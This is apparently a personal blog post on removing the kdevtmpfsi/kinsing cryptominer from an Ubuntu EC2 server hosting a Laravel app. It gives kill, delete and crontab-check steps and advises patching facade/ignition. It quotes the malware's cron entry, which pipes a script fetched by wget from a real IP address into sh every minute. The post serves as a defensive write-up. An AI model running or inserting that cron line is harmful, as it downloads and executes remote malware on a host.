---
title: AWS EC2 instance used up CPU 100% - Malware kdevtmpfsi
date: 2021-02-25 22:53:05
tags:
- aws
- ubuntu
- linux
- lemp
- laravel
- malware
---

I was wondering what's wrong with my server _(host Laravel web app)_,
it's fine after reboot the instance, but after a while it become very
slow, and CPU 100%

I'm using **Ubuntu 20.04.2 LTS**

Run

```
$ htop
```

![kdevtmpfsi](/images/posts/2021-02-25-AWS-EC2-instance-used-up-CPU-100-Malware-kdevtmpfsi/kdevtmpfsi.png)

Then I found [this post](https://stackoverflow.com/questions/60151640/kdevtmpfsi-using-the-entire-cpu/)

### 1. kill the process & delete the file

```
$ sudo killall kdevtmpfsi
$ sudo killall kinsing

$ sudo find / -iname kdevtmpfsi* -exec rm -fv {} \;
$ sudo find / -iname kinsing* -exec rm -fv {} \;

$ sudo echo "kdevtmpfsi is fine now" > /tmp/kdevtmpfsi
$ sudo echo "kinsing is fine now" > /tmp/kinsing
$ sudo chown root:root /tmp/kdevtmpfsi /tmp/kinsing
$ sudo chmod 0444 /tmp/kdevtmpfsi
$ sudo chmod 0444 /tmp/kinsing
```

### 2. Check the `www-data` crontab 

```
$ sudo crontab -u www-data -e
```

If you see this, just remove them

```
* * * * * wget -q -O - http://195.3.146.118/lr.sh | sh > /dev/null 2>&1
* * * * * wget -q -O - http://195.3.146.118/lr.sh | sh > /dev/null 2>&1
```

### 3. Patch Laravel

Turn off debug

```
APP_DEBUG=false
```

Update composer package `facade/ignition` to at least `2.5.1`

### 4. Reboot instance

After reboot it's working fine

## References:

- [kdevtmpfsi using the entire CPU](https://stackoverflow.com/questions/60151640/kdevtmpfsi-using-the-entire-cpu/66364005#66364005)
